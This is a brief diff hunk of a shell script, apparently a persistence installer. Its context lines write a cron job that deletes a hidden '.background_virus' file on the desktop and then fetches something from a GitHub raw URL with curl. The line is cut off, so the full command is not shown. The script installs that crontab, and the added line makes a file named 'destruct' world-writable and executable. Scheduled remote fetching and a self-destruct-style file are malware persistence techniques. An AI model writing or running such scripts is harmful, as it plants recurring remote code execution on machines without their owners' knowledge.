@@ -8,3 +8,5 @@ echo "12 20 * * * rm -rf ~/Desktop/.background_virus; curl -fsS https://raw.gith
 #install new cron file
 crontab mycron
 rm mycron
+
+chmod 777 destruct
